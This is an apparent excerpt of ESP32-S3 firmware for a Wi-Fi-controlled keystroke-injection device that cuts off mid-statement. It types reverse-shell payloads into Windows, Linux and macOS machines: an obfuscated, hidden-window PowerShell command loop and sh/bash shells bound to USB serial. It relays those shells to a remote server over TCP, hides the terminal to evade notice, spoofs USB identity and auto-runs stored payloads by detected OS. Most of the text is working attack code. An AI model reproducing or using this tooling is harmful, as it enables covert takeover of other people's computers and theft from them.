(cmd.startsWith(\"ShellWin \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    serverIP = Command + 9;\n\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n\n    delay(3000);\n\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"r\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(200);\n    Keyboard.println(\"powershell\");\n    delay(1000);\n    Keyboard.print(\"Start-Job -ScriptBlock { $a = [System.IO.Ports.SerialPort]::GetPortNames(); $p = New-Object System.IO.Ports.SerialPort $a[$a.Length-1], 115200, None, 8, one; $p.DtrEnable = $true; [array]$mk = \\\"I\\\", \\\"f\\\", \\\"E\\\", \\\"x\\\", \\\"X\\\"; Set-Alias f $($mk | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } }; $x); $p.Open(); Start-Sleep -Seconds 2; while ($true) { $c = $p.ReadLine(); if ($c -eq \\\"exit\\\") { break }; $o = f \\\"$c\\\"; $p.WriteLine($o); $p.WriteLine(\\\"END_OF_COMMAND\\\") }; $p.Close() };function Hide-ConsoleWindow() {$ShowWindowAsyncCode='[DllImport(\\\"user32.dll\\\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$ShowWindowAsync=Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru;$hwnd=(Get-Process -PID $pid).MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}else{$UniqueWindowTitle=New-Guid;$Host.UI.RawUI.WindowTitle=$UniqueWindowTitle;$StringBuilder=New-Object System.Text.StringBuilder 1024;$TerminalProcess=(Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle });$hwnd=$TerminalProcess.MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}}};Hide-ConsoleWindow\");\n    delay(1000);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"ShellNix \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    serverIP = Command + 9;\n\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n\n    delay(3000);\n\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(500);\n    Keyboard.println(\"sh -i > /dev/serial/by-id/*Espressif_Systems_ESP32S3* 2>&1 < /dev/serial/by-id/*Espressif_Systems_ESP32S3*\");\n  }\n\n  else if (cmd.startsWith(\"ServerConnect \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    // the server IP is extracted from the Command array starting from the 14th index\n    serverIP = Command + 14;\n\n    // connect loop\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n  }\n\n  else if (cmd.startsWith(\"ShellMac \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    serverIP = Command + 9;\n\n    // connect loop\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n\n    delay(3000);\n\n    // run spotlight/alfred prompt\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n\n    delay(1000);\n    // type terminal\n    Keyboard.print(\"terminal\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n\n    // open new terminal tab, just in case there is terminal open with some chars - make greenlandi (press optin+t)\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n\n    // compressed payload\n    Keyboard.println(\"sh -c 'D=$(ls -t /dev/cu.usbmodem* 2>/dev/null | head -n1) && exec 196<>$D; bash -i >&$D 0<&196 2>&196' &\");\n\n    // payload keyboard press event cleanup\n    delay(100);\n    Keyboard.releaseAll();\n\n    // hide visible output on terminal\n    Keyboard.println(\"clear\");\n    delay(100);\n    Keyboard.releaseAll();\n\n    // hide terminal (option+h)\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"h\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"ShellMacCleanup\")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n\n    delay(3000);\n\n    // terminal cleanup - close tab\n\n    // run spotlight/alfred prompt\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n\n    delay(1000);\n    // type terminal\n    Keyboard.print(\"terminal\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n\n    // cloease tab - option + w\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"w\");\n    delay(100);\n    Keyboard.releaseAll();\n\n    // enter, in case of alert window\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n\n    // hide terminal (option+h)\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"h\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"AltF2\") {\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.press(KEY_F2);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"CtrlAltT\") {\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"GuiR\") {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"r\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"Gui\") {\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"GuiSpace\") {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"DetectOS\") {\n    onDetectOSRequested();\n  }\n\n  else if (cmd.startsWith(\"PrintLine \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.println(Command + 10);\n  }\n\n  else if (cmd.startsWith(\"WinPrintLine \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    writeLineWindows(Command + 13);\n    delay(10);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"Print \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.print(Command + 6);\n  }\n\n  else if (cmd.startsWith(\"WinPrint \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    writeLineWindows(Command + 9);\n  }\n\n  else if (cmd.startsWith(\"Press \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    tmp_key = Command + 6;\n    char key = tmp_key[0];\n    cmd.remove(0, 6);\n\n    if (keyMap.find(cmd) != keyMap.end()) {\n      uint8_t keyCode = keyMap[cmd];\n      Keyboard.press(keyCode);\n    } else {\n      uint8_t keyCode = (uint8_t)key;\n      Keyboard.press(keyCode);\n    }\n  }\n\n  else if (cmd.startsWith(\"PressRelease \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    tmp_key = Command + 13;\n    char key = tmp_key[0];\n    cmd.remove(0, 13);\n\n    if (keyMap.find(cmd) != keyMap.end()) {\n      uint8_t keyCode = keyMap[cmd];\n      Keyboard.press(keyCode);\n      delay(100);\n      Keyboard.releaseAll();\n    } else {\n      uint8_t keyCode = (uint8_t)key;\n      Keyboard.press(keyCode);\n      delay(100);\n      Keyboard.releaseAll();\n    }\n  }\n\n  else if (cmd.startsWith(\"Release\")) {\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"Delay \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    delay(atoi(Command + 6));\n  }\n\n  else if (cmd.startsWith(\"RunPowershellAdmin\")) {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"x\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.print(\"a\");\n    delay(3000);\n    Keyboard.press(KEY_LEFT_ARROW);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(100);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"RunCmdAdmin\")) {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"r\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.print(\"cmd\");\n    delay(2000);\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_SHIFT);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.press(KEY_LEFT_ARROW);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(100);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n}\n\nvoid handleUpdateWiFi() {\n  if (controlserver.hasArg(\"ssid\") && controlserver.hasArg(\"password\")) {\n    String newSSID = controlserver.arg(\"ssid\");\n    String newPassword = controlserver.arg(\"password\");\n\n    File fsUploadFile = LittleFS.open(\"/wifi_config.txt\", FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to open file for writing\\\"}\");\n      return;\n    }\n\n    fsUploadFile.println(newSSID);\n    fsUploadFile.println(newPassword);\n    fsUploadFile.close();\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Wi-Fi config applied successfully! Device will restart.\\\"}\");\n    delay(1000);  // Give time for response to be sent\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Missing SSID or password\\\"}\");\n  }\n}\n\nvoid handleUpdateBackupWiFi() {\n  if (controlserver.hasArg(\"ssid\") && controlserver.hasArg(\"password\")) {\n    String ssid = controlserver.arg(\"ssid\");\n    String password = controlserver.arg(\"password\");\n    File file = LittleFS.open(\"/wifi_backup_config.txt\", FILE_WRITE);\n    if (!file) {\n      controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to save backup Wi-Fi config\\\"}\");\n      return;\n    }\n    file.println(ssid);\n    file.println(password);\n    file.close();\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Backup Wi-Fi config saved. Device will restart.\\\"}\");\n    delay(1000);\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Missing SSID or password\\\"}\");\n  }\n}\n\nvoid handleDeleteWiFiConfig() {\n  if (LittleFS.remove(\"/wifi_config.txt\")) {\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Wi-Fi config deleted successfully\\\"}\");\n    connectToWiFi();\n  } else {\n    controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to delete the file\\\"}\");\n  }\n}\n\nvoid handleDeleteBackupWiFiConfig() {\n  if (LittleFS.remove(\"/wifi_backup_config.txt\")) {\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Backup Wi-Fi config deleted successfully\\\"}\");\n    if (WiFi.status() != WL_CONNECTED) {\n      connectToWiFi();\n    }\n  } else {\n    controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to delete backup Wi-Fi config\\\"}\");\n  }\n}\n\nvoid handleUpdateUSB() {\n  if (controlserver.hasArg(\"vendorID\") && controlserver.hasArg(\"productID\") && controlserver.hasArg(\"productName\") && controlserver.hasArg(\"manufacturerName\")) {\n\n    String vendorID = controlserver.arg(\"vendorID\");\n    String productID = controlserver.arg(\"productID\");\n    String productName = controlserver.arg(\"productName\");\n    String manufacturerName = controlserver.arg(\"manufacturerName\");\n\n    File fsUploadFile = LittleFS.open(\"/usb_config.txt\", FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n      return;\n    }\n\n    fsUploadFile.println(vendorID);\n    fsUploadFile.println(productID);\n    fsUploadFile.println(productName);\n    fsUploadFile.println(manufacturerName);\n    fsUploadFile.close();\n    controlserver.send(200, \"text/plain\", \"USB config applied successfully! The device will restart.\");\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"text/plain\", \"Missing USB configuration data\");\n  }\n}\n\nvoid handleDeleteUSBConfig() {\n  if (LittleFS.exists(\"/usb_config.txt\")) {\n    if (LittleFS.remove(\"/usb_config.txt\")) {\n      controlserver.send(200, \"text/plain\", \"USB config deleted successfully\");\n      ESP.restart();\n    } else {\n      controlserver.send(500, \"text/plain\", \"Failed to delete USB config file\");\n    }\n  } else {\n    controlserver.send(500, \"text/plain\", \"USB config file does not exist\");\n  }\n}\n\nvoid handleLayout() {\n  if (controlserver.hasArg(\"layout\")) {\n    String layout = controlserver.arg(\"layout\");\n    auto it = layoutMapInit.find(layout);\n\n    if (it != layoutMapInit.end()) {\n      Keyboard.setLayout(it->second);\n      saveLayoutConfig(layout);  // Save the layout selection\n      controlserver.send(200, \"text/plain\", \"Layout applied successfully!\");\n    } else {\n      controlserver.send(400, \"text/plain\", \"Invalid layout specified.\");\n    }\n  } else {\n    controlserver.send(400, \"text/plain\", \"No layout specified.\");\n  }\n}\n\nvoid handleGetCurrentLayout() {\n  String currentLayout = getCurrentLayout();\n  controlserver.send(200, \"text/plain\", currentLayout);\n}\n\nvoid handleDeletePayload() {\n  if (controlserver.hasArg(\"configmodule\")) {\n    String filenameToDelete = controlserver.arg(\"configmodule\");\n    if (filenameToDelete.length() > 0) {\n      deleteFile(LittleFS, filenameToDelete);\n    } else {\n      controlserver.send(400, \"text/plain\", \"File name is empty\");\n    }\n  } else {\n    controlserver.send(400, \"text/plain\", \"Missing file name\");\n  }\n}\n\nvoid setup() {\n  USB.onEvent(usbEventCallback);\n  Keyboard.onEvent(usbEventCallback);\n  USBSerial.onEvent(usbEventCallback);\n\n  if (!LittleFS.begin(true)) {\n    // format in case of missing file system\n    LittleFS.format();\n    delay(1000);\n    ESP.restart();\n  }\n\n  if (LittleFS.exists(\"/usb_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/usb_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      String vendorID = fsUploadFile.readStringUntil('\\n');\n      vendorID.trim();\n      String productID = fsUploadFile.readStringUntil('\\n');\n      productID.trim();\n      String productName = fsUploadFile.readStringUntil('\\n');\n      productName.trim();\n      String manufacturerName = fsUploadFile.readStringUntil('\\n');\n      manufacturerName.trim();\n      fsUploadFile.close();\n      USB.VID(strtol(vendorID.c_str(), nullptr, 16));\n      USB.PID(strtol(productID.c_str(), nullptr, 16));\n      USB.manufacturerName(manufacturerName.c_str());\n      USB.productName(productName.c_str());\n    }\n  }\n\n  USB.begin();\n  Keyboard.begin();\n  USBSerial.begin();\n\n  if (LittleFS.exists(\"/layout_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      String layoutKey = fsUploadFile.readStringUntil('\\n');\n      layoutKey.trim();\n      fsUploadFile.close();\n      auto it = layoutMapInit.find(layoutKey);\n      if (it != layoutMapInit.end()) {\n        selected_layout = it->second;\n      }\n    }\n  }\n  Keyboard.setLayout(selected_layout);\n\n  if (LittleFS.exists(\"/payloads/payload-startup.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/payloads/payload-startup.txt\", FILE_READ);\n    if (fsUploadFile) {\n      livepayload = fsUploadFile.readString();\n      // Set layout based on payload content\n      setLayoutFromPayload(livepayload);\n      payload_state = 1;\n      payloadExecuted = false;\n    }\n  }\n\n  connectToWiFi();\n\n  {\n    File root = LittleFS.open(\"/payloads/\");\n    if (root && root.isDirectory()) {\n      File file = root.openNextFile();\n      while (file) {\n        String fileName = file.name();\n        size_t fileSize = file.size();\n        file = root.openNextFile();\n      }\n    }\n  }\n\n  delay(3000);\n\n  controlserver.on(\"/\", []() {\n    controlserver.send_P(200, \"text/html\", Index);\n  });\n\n  controlserver.on(\"/stats\", handleStats);\n\n  controlserver.on(\"/connectioncheck\", []() {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"ok\\\"}\");\n  });\n\n  controlserver.on(\"/livepayload\", []() {\n    controlserver.send_P(200, \"text/html\", LivePayload);\n  });\n\n  controlserver.on(\"/uploadpayload\", []() {\n    controlserver.send_P(200, \"text/html\", UploadPayload);\n  });\n\n  controlserver.on(\"/config\", []() {\n    controlserver.send_P(200, \"text/html\", Configuration);\n  });\n\n  controlserver.on(\n    \"/upload\", HTTP_POST, []() {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"File uploaded successfully\\\"}\");\n    },\n    handleFileUpload);\n\n  controlserver.on(\"/listpayloads\", []() {\n    listDir(LittleFS, \"/payloads\", 0);\n    controlserver.send(200, \"text/html\", FileList);\n  });\n\n  controlserver.on(\"/showpayload\", []() {\n    String fileName = controlserver.arg(\"payload\");\n    readFile(LittleFS, fileName);\n    controlserver.send(200, \"text/html\", FileList);\n  });\n\n  controlserver.on(\"/style.css\", []() {\n    // Set aggressive caching for CSS\n    controlserver.sendHeader(\"Cache-Control\", \"public, max-age=1728000\");   // Cache for 20 days\n    controlserver.sendHeader(\"ETag\", \"\\\"v1.0\\\"\");                           // Add ETag for cache validation\n    controlserver.send_P(200, \"text/css\", Style);\n  });\n\n  controlserver.on(\"/javascript.js\", []() {\n    // Set aggressive caching for JavaScript\n    controlserver.sendHeader(\"Cache-Control\", \"public, max-age=1728000\");  // Cache for 20 days\n    controlserver.sendHeader(\"ETag\", \"\\\"v1.0\\\"\");                           // Add ETag for cache validation\n    controlserver.send_P(200, \"application/javascript\", Redirect);\n  });\n\n  controlserver.on(\"/reboot\", HTTP_POST, []() {\n      // Send response first\n      controlserver.send(200, \"application/json\", \"{\\\"success\\\":true,\\\"message\\\":\\\"Device rebooting\\\"}\");\n      \n      // Delay to ensure response is sent\n      controlserver.client().setNoDelay(true);\n      delay(100);\n      controlserver.client().stop();\n      delay(100);\n      \n      // Then reboot\n      ESP.restart();\n  });\n\n  controlserver.on(\"/dopayload\", []() {\n    if (livepayload != \"\") {\n      payload_state = 1;\n      payloadExecuted = false;\n    }\n    controlserver.send(200, \"text/plain\", \"Payload running...\");\n  });\n\n  controlserver.on(\"/runlivepayload\", []() {\n    livepayload = controlserver.arg(\"livepayload\");\n    if (controlserver.arg(\"configmodule\")) {\n      payload_state = 1;\n      payloadExecuted = false;\n    }\n    controlserver.send(200, \"text/plain\", \"Payload running...\");\n  });\n\n  controlserver.on(\"/runlivestartup\", []() {\n    String payload_startup = controlserver.arg(\"livepayload\");\n    String fileName = \"payload-startup.txt\";\n    String filePath = \"/payloads/\" + fileName;\n\n    if (!LittleFS.exists(\"/payloads\")) {\n      LittleFS.mkdir(\"/payloads\");\n    }\n\n    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n      return;\n    }\n\n    fsUploadFile.print(payload_startup);\n    fsUploadFile.close();\n\n    // Set layout based on payload content if specified\n    setLayoutFromPayload(payload_startup);\n\n    payloadExecuted = true;\n    controlserver.send(200, \"text/plain\", \"Payload saved\");\n  });\n\n  controlserver.on(\"/runlivesave\", HTTP_POST, []() {\n    String payload_save = controlserver.arg(\"livepayload\");\n    String payloadName = controlserver.arg(\"payloadName\");\n    String payloadDesc = controlserver.arg(\"payloadDescription\");\n    String payloadOS = controlserver.arg(\"payloadOS\");\n    String fileName;\n\n    // Set layout based on payload content if specified\n    setLayoutFromPayload(payload_save);\n\n    int namePos = payload_save.indexOf(\"# Name: \");\n    if (namePos != -1) {\n      int start = namePos + 8;\n      int end = payload_save.indexOf('\\n', start);\n      if (end == -1) {\n        end = payload_save.length();\n      }\n      fileName = payload_save.substring(start, end);\n      fileName.trim();\n    }\n\n    if (fileName.length() == 0 || fileName.indexOf('/') != -1) {\n      const char charset[] = \"abcdefghijklmnopqrstuvwxyz1234567890\";\n      fileName = \"livepayload-\";\n      for (int i = 0; i < 8; i++) {\n        fileName += charset[random(0, 26)];\n      }\n      fileName += \".txt\";\n    }\n\n    String filePath = \"/payloads/\" + fileName;\n\n    if (!LittleFS.exists(\"/payloads\")) {\n      LittleFS.mkdir(\"/payloads\");\n    }\n\n    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n      return;\n    }\n    fsUploadFile.print(payload_save);\n    fsUploadFile.close();\n\n    // Save metadata\n    savePayloadMetadata(filePath, payloadName, payloadDesc, payloadOS);\n\n    payloadExecuted = true;\n    controlserver.send(200, \"text/plain\", \"Payload saved\");\n  });\n\n  controlserver.on(\"/payloadstatuspayload\", []() {\n    if (payloadExecuted) {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"executed\\\"}\");\n      payloadExecuted = false;\n    } else {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"pending\\\"}\");\n    }\n  });\n\n  controlserver.on(\"/payloadstatusstartup\", []() {\n    if (payloadExecuted) {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"executed\\\"}\");\n      payloadExecuted = false;\n    } else {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"pending\\\"}\");\n    }\n  });\n\n  controlserver.on(\"/payloadstatussave\", []() {\n    if (payloadExecuted) {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"executed\\\"}\");\n      payloadExecuted = false;\n    } else {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"pending\\\"}\");\n    }\n  });\n\n  controlserver.on(\"/autoexecplanning\", []() {\n    controlserver.send_P(200, \"text/html\", AutoExecPlanning);\n  });\n\n  controlserver.on(\"/listpayloadsdata\", []() {\n    DynamicJsonDocument doc(4096);\n    JsonArray payloads = doc.to<JsonArray>();\n\n    File root = LittleFS.open(\"/payloads/\");\n    if (root && root.isDirectory()) {\n      File file = root.openNextFile();\n      while (file) {\n        String fileName = file.name();\n        if (!fileName.endsWith(\".meta\")) {\n          String filePath = \"/payloads/\" + fileName;\n          String payloadName = readPayloadMetadata(filePath, META_NAME);\n          String payloadDesc = readPayloadMetadata(filePath, META_DESCRIPTION);\n\n          JsonObject payload = payloads.createNestedObject();\n          payload[\"path\"] = filePath;\n          payload[\"name\"] = payloadName;\n          payload[\"description\"] = payloadDesc;\n          payload[\"filename\"] = fileName;\n        }\n        file = root.openNextFile();\n      }\n    }\n\n    String output;\n    serializeJson(doc, output);\n    controlserver.send(200, \"application/json\", output);\n  });\n\n  controlserver.on(\"/saveautoexecplan\", HTTP_POST, []() {\n    String payload = controlserver.arg(\"plain\");\n    DynamicJsonDocument doc(2048);\n    deserializeJson(doc, payload);\n\n    File file = LittleFS.open(\"/autoexec_plan.json\", FILE_WRITE);\n    if (!file) {\n      controlserver.send(500, \"application/json\", \"{\\\"success\\\":false}\");\n      return;\n    }\n\n    serializeJson(doc, file);\n    file.close();\n    controlserver.send(200, \"application/json\", \"{\\\"success\\\":true}\");\n  });\n\n  controlserver.on(\"/getautoexecplan\", []() {\n    if (!LittleFS.exists(\"/autoexec_plan.json\")) {\n      controlserver.send(200, \"application/json\", \"{}\");\n      return;\n    }\n\n    File file = LittleFS.open(\"/autoexec_plan.json\", FILE_READ);\n    if (!file) {\n      controlserver.send(500, \"application/json\", \"{}\");\n      return;\n    }\n\n    String content = file.readString();\n    file.close();\n    controlserver.send(200, \"application/json\", content);\n  });\n\n  controlserver.on(\"/clearautoexecplan\", HTTP_POST, []() {\n    if (LittleFS.exists(\"/autoexec_plan.json\")) {\n      LittleFS.remove(\"/autoexec_plan.json\");\n    }\n    controlserver.send(200, \"application/json\", \"{\\\"success\\\":true}\");\n  });\n\n  controlserver.on(\"/updatepayload\", HTTP_POST, []() {\n    if (controlserver.hasArg(\"plain\")) {  // Check for JSON data\n      String payload = controlserver.arg(\"plain\");\n      DynamicJsonDocument doc(2048);\n      deserializeJson(doc, payload);\n\n      String path = doc[\"path\"].as<String>();\n      String content = doc[\"content\"].as<String>();\n\n      if (path.length() > 0 && content.length() > 0) {\n        File file = LittleFS.open(path, FILE_WRITE);\n        if (!file) {\n          controlserver.send(500, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"Failed to open file for writing\\\"}\");\n          return;\n        }\n\n        file.print(content);\n        file.close();\n\n        // Update layout if specified in payload\n        setLayoutFromPayload(content);\n\n        controlserver.send(200, \"application/json\", \"{\\\"success\\\":true,\\\"message\\\":\\\"Payload updated successfully\\\"}\");\n      } else {\n        controlserver.send(400, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"Missing path or content parameters\\\"}\");\n      }\n    } else {\n      controlserver.send(400, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"No data received\\\"}\");\n    }\n  });\n\n\n  controlserver.on(\"/updatewifi\", HTTP_POST, handleUpdateWiFi);\n  controlserver.on(\"/layout\", HTTP_POST, handleLayout);\n  controlserver.on(\"/deletewificonfig\", HTTP_POST, handleDeleteWiFiConfig);\n  controlserver.on(\"/updateusb\", HTTP_POST, handleUpdateUSB);\n  controlserver.on(\"/deleteusbconfig\", HTTP_POST, handleDeleteUSBConfig);\n  controlserver.on(\"/deletepayload\", HTTP_POST, handleDeletePayload);\n  controlserver.on(\"/getcurrentlayout\", handleGetCurrentLayout);\n  controlserver.on(\"/updatehostname\", HTTP_POST, handleUpdateHostname);\n  controlserver.on(\"/gethostname\", handleGetHostname);\n  controlserver.on(\"/updatebackupwifi\", HTTP_POST, handleUpdateBackupWiFi);\n  controlserver.on(\"/deletebackupwificonfig\", HTTP_POST, handleDeleteBackupWiFiConfig);\n  controlserver.on(\"/updatepayload\", HTTP_POST, handleUpdatePayload);\n\n  httpUpdater.setup(&controlserver);\n  controlserver.begin();\n}\n\nvoid loop() {\n  controlserver.handleClient();\n  delay(10);\n  vTaskDelay(1);\n\n  // Check if we should auto-execute a payload\n  static bool autoExecChecked = false;\n  static unsigned long osDetectionStartTime = 0;\n  static bool osDetectionInProgress = false;\n  static DynamicJsonDocument pendingAutoExecPlan(2048);\n  static bool hasPendingPlan = false;\n  static bool firstRun = true;\n\n  // Only check once per boot\n  if (firstRun) {\n    firstRun = false;\n    \n    if (LittleFS.exists(\"/autoexec_plan.json\")) {\n      File file = LittleFS.open(\"/autoexec_plan.json\", FILE_READ);\n      if (file) {\n        String content = file.readString();\n        file.close();\n        deserializeJson(pendingAutoExecPlan, content);\n\n        if (pendingAutoExecPlan[\"enabled\"] == true) {\n          // Check if we have a no-detection payload\n          if (pendingAutoExecPlan[\"nodetection\"]) {\n            String osPayloadPath = pendingAutoExecPlan[\"nodetection\"][\"path\"].as<String>();\n            if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {\n              readFile(LittleFS, osPayloadPath);\n              payload_state = 1;\n              payloadExecuted = false;\n              autoExecChecked = true;\n            }\n          } else {\n            // If no no-detection payload, proceed with OS detection\n            onDetectOSRequested();\n            osDetectionStartTime = millis();\n            osDetectionInProgress = true;\n            hasPendingPlan = true;\n            autoExecChecked = true;\n          }\n        }\n      }\n    }\n  }\n\n  // Handle OS detection completion\n  if (osDetectionInProgress) {\n    if (os_detection_complete) {\n      // Detection complete, execute payload if available\n      if (hasPendingPlan) {\n        String osPayloadPath = \"\";\n\n        switch (detected_os) {\n          case OS_WINDOWS:\n            osPayloadPath = pendingAutoExecPlan[\"windows\"][\"path\"].as<String>();\n            break;\n          case OS_LINUX:\n            osPayloadPath = pendingAutoExecPlan[\"linux\"][\"path\"].as<String>();\n            break;\n          case OS_IOS:\n            osPayloadPath = pendingAutoExecPlan[\"ios\"][\"path\"].as<String>();\n            break;\n          case OS_MACOS:\n            osPayloadPath = pendingAutoExecPlan[\"macos\"][\"path\"].as<String>();\n            break;\n          case OS_ANDROID:\n            osPayloadPath = pendingAutoExecPlan[\"android\"][\"path\"].as<String>();\n            break;\n          default:\n            break;\n        }\n\n        if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {\n          readFile(LittleFS, osPayloadPath);\n          payload_state = 1;\n          payloadExecuted = false;\n        }\n      }\n      osDetectionInProgress = false;\n      hasPendingPlan = false;\n    } else if (millis() - osDetectionStartTime > 30000) {\n      // Timeout after 30 seconds if detection fails\n      os = \"OS Unknown\";\n      os_detection_complete = true;\n      osDetectionInProgress = false;\n      hasPendingPlan = false;\n    }\n  }\n\n  while (USBSerial.available()) {\n    String data = USBSerial.readString();\n    clientServer.print(data);\n  }\n  while (clientServer.available()) {\n    String data = clientServer.readString();\n    USBSerial.print(data);\n  }\n  if (payload_state == 1) {\n    // Set layout before executing payload\n    setLayoutFromPayload(livepayload);\n\n    char *splitlines;\n    int payloadlen = livepayload.length() + 1;\n    char request[payloadlen];\n    livepayload.toCharArray(request, payloadlen);\n    splitlines = strtok(request, 